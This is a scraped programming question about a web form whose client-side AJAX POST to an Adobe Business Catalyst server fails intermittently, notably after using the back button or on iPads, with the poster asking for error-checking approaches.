Negative 21970 pI have a web form where I bind some JavaScript to make a few checks to match data and then, just before the form submits, uses AJAX to POST the data to a server where the data can be emailed.p  pThis is an Adobe Business Catalyst server, so I have virtually NO serverside abilities to work with here, so unfortunately, I have to come up with clientside solutions.  If this was a typical PHP project, I wouldnt have these problems and no, the Adobe choice was not mine.p  pThe problem Im having is that the firing of the POST function doesnt always seem to work.  It seems that it works maybe 13rd of the time it should.  If someone submits the form, itll work, but if they hit the back button, for example, refill out the form and submit it, it wont go.  It seems people are having many failures submitting from iPads.  Theres not DEFINITIVE pattern I can find.p  pWhat Id like to do is some kind of error checking, but the methods Ive read about and have tried have not worked at all.
